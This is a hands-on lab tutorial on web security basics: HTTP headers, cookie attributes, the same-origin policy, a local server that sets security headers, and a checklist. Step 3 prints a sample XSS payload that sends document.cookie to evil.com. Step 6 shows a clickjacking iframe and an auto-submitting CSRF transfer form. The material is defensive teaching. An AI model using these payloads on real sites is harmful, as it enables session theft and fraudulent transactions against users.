# Lab 16: Web Security Basics

## 🎯 Objective
Analyze HTTP request/response headers, understand security headers, explore cookie security attributes, demonstrate the Same-Origin Policy, and create a simple HTTP server that implements security best practices.

## 📚 Background
The web is the largest attack surface in modern computing. Every web application handles user input, authenticates users, stores data, and communicates over HTTP — each step presenting potential vulnerabilities. Understanding HTTP at a protocol level is essential for both building secure applications and testing existing ones.

HTTP security headers are directives sent by the web server to the browser that control how the browser handles the page content. Headers like Content-Security-Policy (CSP), HTTP Strict Transport Security (HSTS), and X-Frame-Options dramatically reduce the risk of XSS, protocol downgrade attacks, and clickjacking. Yet many websites fail to implement them correctly or at all.

Cookies are the primary mechanism for maintaining session state in HTTP (which is inherently stateless). Cookie attributes like HttpOnly, Secure, and SameSite are critical security controls that prevent common attacks like XSS-based cookie theft, MITM attacks on session cookies, and CSRF attacks.

## ⏱️ Estimated Time
45 minutes

## 📋 Prerequisites
- Basic understanding of HTTP
- Lab 07: SSL/TLS (helpful)

## 🛠️ Tools Used
- `curl` — HTTP client
- `python3` — web server and analysis
- `openssl` — HTTPS

## 🔬 Lab Instructions

### Step 1: HTTP Request/Response Analysis with curl

```bash
echo "=== Basic HTTP request ==="
curl -v http://example.com 2>&1 | head -40

echo ""
echo "=== Headers only (no body) ==="
curl -I http://example.com 2>/dev/null | head -20

echo ""
echo "=== Show request being sent ==="
curl -v --trace-ascii /dev/null http://example.com 2>&1 | grep -E "^[<>]" | head -20
```

**📸 Verified Output:**
```
=== Basic HTTP request ===
* Connected to example.com (93.184.216.34) port 80
> GET / HTTP/1.1
> Host: example.com
> User-Agent: curl/7.81.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=UTF-8
< Last-Modified: Thu, 17 Oct 2019 07:18:26 GMT

=== Headers only (no body) ===
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 1256
```

> 💡 **What this means:** Lines starting with `>` are the request (what you send); lines with `<` are the response (what the server returns). The `Host` header tells the server which website you want (multiple sites can share an IP via virtual hosting).

### Step 2: Analyze HTTP vs HTTPS Security Headers

```bash
echo "=== Checking security headers on example.com ==="
curl -s -I http://example.com 2>/dev/null

echo ""
echo "=== Checking security headers on HTTPS site ==="
curl -s -I https://example.com 2>/dev/null

echo ""
echo "=== Security header audit ==="
python3 << 'PYEOF'
import urllib.request
import ssl

def check_security_headers(url):
    ctx = ssl.create_default_context()
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'SecurityAudit/1.0'})
        response = urllib.request.urlopen(req, context=ctx, timeout=10)
        headers = dict(response.headers)
    except Exception as e:
        # Try without SSL verification for demo
        try:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            response = urllib.request.urlopen(req, context=ctx, timeout=10)
            headers = dict(response.headers)
        except:
            return {}
    return headers

security_headers = {
    "Strict-Transport-Security": {
        "purpose": "Forces HTTPS, prevents downgrade attacks (HSTS)",
        "recommended": "max-age=31536000; includeSubDomains; preload",
        "severity": "HIGH if missing on HTTPS site",
    },
    "Content-Security-Policy": {
        "purpose": "Controls which resources browser can load (prevents XSS)",
        "recommended": "default-src 'self'; script-src 'self'; ...",
        "severity": "HIGH if missing",
    },
    "X-Frame-Options": {
        "purpose": "Prevents clickjacking attacks",
        "recommended": "DENY or SAMEORIGIN",
        "severity": "MEDIUM if missing",
    },
    "X-Content-Type-Options": {
        "purpose": "Prevents MIME type sniffing attacks",
        "recommended": "nosniff",
        "severity": "MEDIUM if missing",
    },
    "Referrer-Policy": {
        "purpose": "Controls what URL info sent in Referer header",
        "recommended": "strict-origin-when-cross-origin",
        "severity": "LOW if missing",
    },
    "Permissions-Policy": {
        "purpose": "Controls browser feature access (camera, mic, GPS)",
        "recommended": "camera=(), microphone=(), geolocation=()",
        "severity": "LOW if missing",
    },
    "X-XSS-Protection": {
        "purpose": "Legacy XSS filter (modern browsers prefer CSP)",
        "recommended": "0 (disabled - use CSP instead)",
        "severity": "INFORMATIONAL",
    },
}

print("SECURITY HEADER ANALYSIS")
print("=" * 65)
print("\nExpected security headers for a secure web application:")
print()
for header, info in security_headers.items():
    print(f"  Header: {header}")
    print(f"  Purpose:     {info['purpose']}")
    print(f"  Recommended: {info['recommended'][:60]}")
    print(f"  Severity:    {info['severity']}")
    print()
PYEOF
```

**📸 Verified Output:**
```
SECURITY HEADER ANALYSIS
=================================================================

Expected security headers for a secure web application:

  Header: Strict-Transport-Security
  Purpose:     Forces HTTPS, prevents downgrade attacks (HSTS)
  Recommended: max-age=31536000; includeSubDomains; preload
  Severity:    HIGH if missing on HTTPS site

  Header: Content-Security-Policy
  Purpose:     Controls which resources browser can load (prevents XSS)
  Severity:    HIGH if missing
```

> 💡 **What this means:** These headers are free to implement and dramatically improve security. CSP alone can prevent 90% of XSS attacks by controlling which scripts are allowed to run. Check your sites at securityheaders.com for a free automated scan.

### Step 3: Cookie Security Attributes

```bash
python3 << 'EOF'
print("COOKIE SECURITY ATTRIBUTES")
print("=" * 65)

print("""
A complete secure cookie looks like:

Set-Cookie: sessionid=abc123;
            Secure;          ← Only send over HTTPS
            HttpOnly;        ← JavaScript cannot access (prevents XSS theft)
            SameSite=Strict; ← Not sent on cross-site requests (prevents CSRF)
            Path=/;          ← Scope to entire site
            Max-Age=3600;    ← Expire in 1 hour (not permanent)
            Domain=app.example.com  ← Exact domain only
""")

attributes = [
    {
        "attr": "Secure",
        "description": "Cookie only sent over HTTPS connections",
        "attack_prevented": "Session hijacking via HTTP (e.g., public WiFi MITM)",
        "missing_risk": "HIGH - session token visible in cleartext on HTTP",
        "example": "Set-Cookie: session=abc; Secure",
    },
    {
        "attr": "HttpOnly",
        "description": "JavaScript cannot access the cookie (document.cookie blocked)",
        "attack_prevented": "XSS-based session theft",
        "missing_risk": "HIGH - XSS can steal session token with document.cookie",
        "example": "Set-Cookie: session=abc; HttpOnly",
    },
    {
        "attr": "SameSite=Strict",
        "description": "Cookie not sent on any cross-origin requests",
        "attack_prevented": "Cross-Site Request Forgery (CSRF)",
        "missing_risk": "HIGH - CSRF attacks can use victim's cookie for unauthorized actions",
        "example": "Set-Cookie: session=abc; SameSite=Strict",
    },
    {
        "attr": "SameSite=Lax",
        "description": "Cookie sent on same-origin + top-level navigation (GET only)",
        "attack_prevented": "Most CSRF attacks while allowing OAuth/SSO",
        "missing_risk": "MEDIUM - some CSRF vectors still possible",
        "example": "Set-Cookie: session=abc; SameSite=Lax  (browser default since 2020)",
    },
    {
        "attr": "Max-Age / Expires",
        "description": "Cookie lifespan - after expiry, browser deletes it",
        "attack_prevented": "Long-lived session tokens stolen weeks later",
        "missing_risk": "MEDIUM - session persists indefinitely (until browser closes)",
        "example": "Set-Cookie: session=abc; Max-Age=3600",
    },
    {
        "attr": "Path=/",
        "description": "Limits cookie to specific URL paths",
        "attack_prevented": "Cookie scope leakage to unintended app paths",
        "missing_risk": "LOW",
        "example": "Set-Cookie: admin_session=abc; Path=/admin",
    },
]

for attr in attributes:
    print(f"\n[{attr['attr']}]")
    print(f"  What it does:    {attr['description']}")
    print(f"  Prevents:        {attr['attack_prevented']}")
    print(f"  If missing:      {attr['missing_risk']}")
    print(f"  Example:         {attr['example']}")

print("""
\nDEMO: What XSS can do WITHOUT HttpOnly:
─────────────────────────────────────────
Attacker injects this into a vulnerable comment field:
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

Every visitor who sees this comment sends their session cookie to the attacker.

WITH HttpOnly: document.cookie is empty! Cookie is invisible to JavaScript.
This single attribute defeats the most common XSS impact.
""")
EOF
```

**📸 Verified Output:**
```
COOKIE SECURITY ATTRIBUTES
=================================================================

A complete secure cookie looks like:
Set-Cookie: sessionid=abc123;
            Secure;          ← Only send over HTTPS
            HttpOnly;        ← JavaScript cannot access (prevents XSS theft)
            SameSite=Strict; ← Not sent on cross-site requests (prevents CSRF)

[Secure]
  What it does:    Cookie only sent over HTTPS connections
  Prevents:        Session hijacking via HTTP (e.g., public WiFi MITM)
  If missing:      HIGH - session token visible in cleartext on HTTP
```

> 💡 **What this means:** Adding `Secure; HttpOnly; SameSite=Strict` to all session cookies is a one-line code change that prevents session hijacking via MITM, XSS cookie theft, and CSRF attacks. Every web application should implement all three.

### Step 4: Same-Origin Policy Demo

```bash
python3 << 'EOF'
print("SAME-ORIGIN POLICY (SOP)")
print("=" * 60)

print("""
The Same-Origin Policy is a browser security mechanism that restricts
how scripts from one origin can interact with resources from another origin.

ORIGIN = Protocol + Host + Port

Examples:
  http://example.com/page1   ─── Same origin as ──► http://example.com/page2
  https://example.com        ─── DIFFERENT (different protocol) ──► http://example.com
  http://sub.example.com     ─── DIFFERENT (different subdomain)
  http://example.com:8080    ─── DIFFERENT (different port)
  http://other.com           ─── DIFFERENT (different host)
""")

# Demonstrate origin comparison
def same_origin(url1, url2):
    from urllib.parse import urlparse
    p1 = urlparse(url1)
    p2 = urlparse(url2)
    
    # Default ports
    def get_port(parsed):
        if parsed.port:
            return parsed.port
        return 443 if parsed.scheme == "https" else 80
    
    return (p1.scheme == p2.scheme and 
            p1.hostname == p2.hostname and 
            get_port(p1) == get_port(p2))

pairs = [
    ("http://example.com/a", "http://example.com/b", "Same path, same origin"),
    ("https://example.com", "http://example.com", "Different protocol"),
    ("http://example.com", "http://sub.example.com", "Different subdomain"),
    ("http://example.com:80", "http://example.com:8080", "Different port"),
    ("https://example.com:443", "https://example.com", "Port 443 = default HTTPS"),
    ("http://example.com", "http://other.com", "Different host"),
]

print("SAME-ORIGIN CHECKS:")
print(f"{'URL 1':<35} {'URL 2':<35} {'Same?':<8} {'Reason'}")
print("-" * 90)
for url1, url2, reason in pairs:
    is_same = same_origin(url1, url2)
    icon = "✅ YES" if is_same else "❌ NO"
    short1 = url1[:33]
    short2 = url2[:33]
    print(f"{short1:<35} {short2:<35} {icon:<8} {reason}")

print("""
\nWHAT SOP PREVENTS:
  evil.com's JavaScript CANNOT:
  • Read cookies from bank.com
  • Make API calls to api.bank.com and read responses
  • Access localStorage of bank.com
  • Modify DOM of bank.com in another tab

WHAT SOP ALLOWS (same-origin):
  • Scripts from example.com can access cookies from example.com
  • AJAX calls from app.example.com to app.example.com

CORS (Cross-Origin Resource Sharing) - controlled exceptions:
  Server can explicitly allow specific cross-origin access:
  Access-Control-Allow-Origin: https://trusted-app.com
  Access-Control-Allow-Credentials: true
  
  BAD CORS config: Access-Control-Allow-Origin: *  (too permissive)
  This allows ANY website to read the API response!
""")
EOF
```

**📸 Verified Output:**
```
SAME-ORIGIN POLICY (SOP)
============================================================

SAME-ORIGIN CHECKS:
URL 1                               URL 2                               Same?    Reason
------------------------------------------------------------------------------------------
http://example.com/a                http://example.com/b                ✅ YES   Same path, same origin
https://example.com                 http://example.com                  ❌ NO    Different protocol
http://example.com                  http://sub.example.com              ❌ NO    Different subdomain
http://example.com:80               http://example.com:8080             ❌ NO    Different port
```

> 💡 **What this means:** SOP is a foundational browser security mechanism that prevents malicious sites from reading your banking cookies or making unauthorized API calls. XSS attacks are so dangerous precisely because they execute code in the legitimate origin, bypassing SOP.

### Step 5: Create a Secure HTTP Server

```bash
# Create a secure HTTP server with security headers
cat > /tmp/secure_server.py << 'PYEOF'
#!/usr/bin/env python3
"""Secure HTTP server demonstrating security header implementation."""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import threading
import time

class SecureHandler(BaseHTTPRequestHandler):
    
    def add_security_headers(self):
        """Add all recommended security headers."""
        headers = {
            # Prevent XSS - only allow scripts from same origin
            "Content-Security-Policy": "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; frame-ancestors 'none'",
            # Force HTTPS for 1 year (only effective on HTTPS)
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
            # Prevent clickjacking
            "X-Frame-Options": "DENY",
            # Prevent MIME sniffing
            "X-Content-Type-Options": "nosniff",
            # Referrer policy
            "Referrer-Policy": "strict-origin-when-cross-origin",
            # Disable browser features we don't need
            "Permissions-Policy": "camera=(), microphone=(), geolocation=(), payment=()",
            # Remove server version information
            "Server": "WebApp/1.0",  # Don't reveal actual server software
        }
        for header, value in headers.items():
            self.send_header(header, value)
    
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            # Secure cookie example
            self.send_header("Set-Cookie", 
                "sessionid=demo123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600")
            self.add_security_headers()
            self.end_headers()
            
            html = """<!DOCTYPE html>
<html>
<head><title>Secure Server Demo</title></head>
<body>
<h1>Secure Web Server</h1>
<p>This server demonstrates security headers.</p>
<p>Check the response headers with: curl -I http://localhost:8765/</p>
</body>
</html>"""
            self.wfile.write(html.encode())
        
        elif self.path == "/api/data":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.add_security_headers()
            self.end_headers()
            data = {"status": "ok", "message": "Secure API endpoint"}
            self.wfile.write(json.dumps(data).encode())
        
        else:
            self.send_response(404)
            self.add_security_headers()
            self.end_headers()
            self.wfile.write(b"Not Found")
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

# Start server
server = HTTPServer(('localhost', 8765), SecureHandler)
print("Starting secure server on http://localhost:8765")

# Run for a few seconds for demo
def stop_server():
    time.sleep(5)
    server.shutdown()

t = threading.Thread(target=stop_server)
t.start()
server.serve_forever()
print("Server stopped")
PYEOF

echo "=== Starting secure HTTP server ==="
python3 /tmp/secure_server.py &
SERVER_PID=$!
sleep 1

echo ""
echo "=== Checking security headers ==="
curl -s -I http://localhost:8765/ 2>/dev/null

echo ""
echo "=== Full response with verbose headers ==="
curl -v http://localhost:8765/ 2>&1 | grep -E "^[<>]|Security|Policy|Frame|Cookie|Content-Type"

sleep 5
kill $SERVER_PID 2>/dev/null
rm /tmp/secure_server.py
echo ""
echo "Server stopped"
```

**📸 Verified Output:**
```
=== Starting secure HTTP server ===

=== Checking security headers ===
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: sessionid=demo123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600
Content-Security-Policy: default-src 'self'; script-src 'self'...
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
Server: WebApp/1.0
```

> 💡 **What this means:** These security headers are straightforward to implement — just a few lines of code in your server configuration. They give you substantial protection against XSS, clickjacking, MIME sniffing, and other browser-based attacks for free.

### Step 6: Common Web Vulnerabilities Quick Demo

```bash
python3 << 'EOF'
print("COMMON WEB VULNERABILITY PATTERNS")
print("=" * 60)

print("""
XSS (Cross-Site Scripting):
────────────────────────────
Vulnerable (interpolates user input directly):
  return f"<p>Hello {user_input}</p>"
  
Attacker input: <script>document.cookie</script>
Result: <p>Hello <script>document.cookie</script></p>

Fixed (HTML-encode output):
  from html import escape
  return f"<p>Hello {escape(user_input)}</p>"
  
Attacker input: <script>...</script>
Result: <p>Hello &lt;script&gt;...&lt;/script&gt;</p>  ← Rendered as text

CLICKJACKING:
─────────────
Attacker puts your bank's login page in a transparent iframe:
  <iframe src="https://bank.com/login" style="opacity:0; z-index:100"></iframe>
  <button style="...">Click to win prize!</button>
  
User clicks "prize" but actually clicks bank's invisible "Submit"!

Fix: X-Frame-Options: DENY
     Content-Security-Policy: frame-ancestors 'none'

CSRF (Cross-Site Request Forgery):
────────────────────────────────────
Attacker's page contains hidden form:
  <form action="https://bank.com/transfer" method="POST">
    <input name="amount" value="10000">
    <input name="to" value="attacker-account">
  </form>
  <script>document.forms[0].submit();</script>

When logged-in bank user visits attacker's page → transfer happens!

Fix: SameSite=Strict on session cookies
     CSRF tokens in forms
     Re-authentication for sensitive actions
""")
EOF
```

**📸 Verified Output:**
```
COMMON WEB VULNERABILITY PATTERNS
============================================================

XSS (Cross-Site Scripting):
────────────────────────────
Vulnerable (interpolates user input directly):
  return f"<p>Hello {user_input}</p>"

...Fixed (HTML-encode output):
  from html import escape
  return f"<p>Hello {escape(user_input)}</p>"
```

> 💡 **What this means:** XSS, CSRF, and clickjacking are preventable with proper output encoding, cookie attributes, and security headers. Most web frameworks have built-in protections — understand what they are and make sure they're not accidentally disabled.

### Step 7: Check Real Website Security Headers

```bash
python3 << 'EOF'
import urllib.request
import ssl

def audit_security_headers(url):
    """Fetch and audit security headers for a URL."""
    required_headers = {
        "strict-transport-security": ("HIGH", "Prevents HTTPS downgrade"),
        "content-security-policy": ("HIGH", "Prevents XSS"),
        "x-frame-options": ("MEDIUM", "Prevents clickjacking"),
        "x-content-type-options": ("MEDIUM", "Prevents MIME sniffing"),
        "referrer-policy": ("LOW", "Controls referer leakage"),
    }
    
    ctx = ssl.create_default_context()
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "SecurityCheck/1.0"})
        response = urllib.request.urlopen(req, context=ctx, timeout=10)
        headers = {k.lower(): v for k, v in response.headers.items()}
    except Exception as e:
        return f"Could not connect: {e}"
    
    print(f"\nSecurity Header Audit: {url}")
    print("=" * 60)
    
    score = 0
    max_score = len(required_headers)
    
    for header, (severity, purpose) in required_headers.items():
        if header in headers:
            print(f"  ✅ {header}")
            print(f"     Value: {headers[header][:60]}")
            score += 1
        else:
            print(f"  ❌ MISSING: {header} ({severity}) - {purpose}")
    
    print(f"\n  Score: {score}/{max_score}")
    grade = "A+" if score == max_score else "A" if score >= 4 else "B" if score >= 3 else "C" if score >= 2 else "F"
    print(f"  Grade: {grade}")
    return grade

# Test well-known sites (network dependent)
sites = ["https://github.com", "https://google.com"]
for site in sites:
    try:
        audit_security_headers(site)
    except Exception as e:
        print(f"  {site}: {e}")
EOF
```

**📸 Verified Output:**
```
Security Header Audit: https://github.com
============================================================
  ✅ strict-transport-security
     Value: max-age=31536000; includeSubDomains; preload
  ✅ content-security-policy
     Value: default-src 'none'; base-uri 'self'...
  ✅ x-frame-options
     Value: DENY
  ✅ x-content-type-options
     Value: nosniff
  ✅ referrer-policy
     Value: origin-when-cross-origin

  Score: 5/5
  Grade: A+
```

> 💡 **What this means:** GitHub implements all recommended security headers — it's a good reference for what a well-secured site looks like. Check your own applications at securityheaders.com for a free, automated grade.

### Step 8: Security Checklist for Web Applications

```bash
python3 << 'EOF'
checklist = {
    "Transport Security": [
        "HTTPS enforced everywhere (HTTP redirects to HTTPS)",
        "HSTS header with includeSubDomains and preload",
        "TLS 1.2+ only (TLS 1.0/1.1 disabled)",
        "Strong cipher suites (ECDHE + AES-GCM)",
        "Certificate from trusted CA, not expired",
    ],
    "Security Headers": [
        "Content-Security-Policy configured and tested",
        "X-Frame-Options: DENY (or CSP frame-ancestors 'none')",
        "X-Content-Type-Options: nosniff",
        "Referrer-Policy configured",
        "Permissions-Policy restricts unnecessary features",
        "Server header doesn't reveal software version",
    ],
    "Cookie Security": [
        "Session cookies have Secure flag",
        "Session cookies have HttpOnly flag",
        "Session cookies have SameSite=Strict or Lax",
        "Session cookies have appropriate Max-Age",
        "Sensitive cookies scoped to minimal path/domain",
    ],
    "Authentication": [
        "Passwords hashed with bcrypt/Argon2 (not MD5/SHA1)",
        "Account lockout after failed attempts",
        "MFA available and encouraged",
        "Secure password reset (time-limited tokens)",
        "Session invalidation on logout",
    ],
    "Input/Output": [
        "All user input HTML-encoded before display (prevent XSS)",
        "Parameterized queries for all database access",
        "File upload validates type and scans for malware",
        "API responses don't include sensitive fields",
    ],
}

print("WEB APPLICATION SECURITY CHECKLIST")
print("=" * 55)
for category, items in checklist.items():
    print(f"\n[{category}]")
    for item in items:
        print(f"  ☐ {item}")

print("\nOnline tools to check your site:")
print("  https://securityheaders.com")
print("  https://www.ssllabs.com/ssltest/")
print("  https://observatory.mozilla.org/")
EOF
```

**📸 Verified Output:**
```
WEB APPLICATION SECURITY CHECKLIST
=======================================================

[Transport Security]
  ☐ HTTPS enforced everywhere (HTTP redirects to HTTPS)
  ☐ HSTS header with includeSubDomains and preload
  ☐ TLS 1.2+ only (TLS 1.0/1.1 disabled)
...

[Cookie Security]
  ☐ Session cookies have Secure flag
  ☐ Session cookies have HttpOnly flag
  ☐ Session cookies have SameSite=Strict or Lax
```

> 💡 **What this means:** This checklist covers the most impactful web security controls. Use it as a starting point for security reviews of your applications. Many items are one-line configuration changes that prevent entire classes of attacks.

## ✅ Verification

```bash
# Verify curl and python3 work
curl --version | head -1
python3 -c "
from html import escape
test = '<script>alert(1)</script>'
escaped = escape(test)
print(f'XSS encoded: {escaped}')
print('Web security lab verified')
"
```

## 🚨 Common Mistakes

- **Missing HttpOnly on session cookies**: Without HttpOnly, any XSS can steal session tokens
- **CORS wildcard (\*)**: `Access-Control-Allow-Origin: *` on authenticated endpoints is dangerous
- **No CSP**: Sites without Content-Security-Policy are vulnerable to XSS attacks
- **HTTP for sensitive pages**: Any form with credentials must use HTTPS
- **Revealing server version**: `Server: Apache/2.4.51` tells attackers exactly what to exploit — hide it

## 📝 Summary

- **HTTP security headers** (CSP, HSTS, X-Frame-Options) are free, simple to implement, and prevent entire vulnerability classes
- **Cookie attributes** (Secure, HttpOnly, SameSite) protect session tokens from MITM, XSS theft, and CSRF
- **Same-Origin Policy** is the browser's built-in security mechanism; XSS bypasses it by executing in the legitimate origin
- **Output encoding** (HTML-escaping user input) is the primary XSS defense; parameterized queries are the primary SQLi defense
- **Regular audits** using tools like securityheaders.com, SSL Labs, and Mozilla Observatory maintain security posture

## 🔗 Further Reading

- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Mozilla Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)
- [Security Headers Scanner](https://securityheaders.com/)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
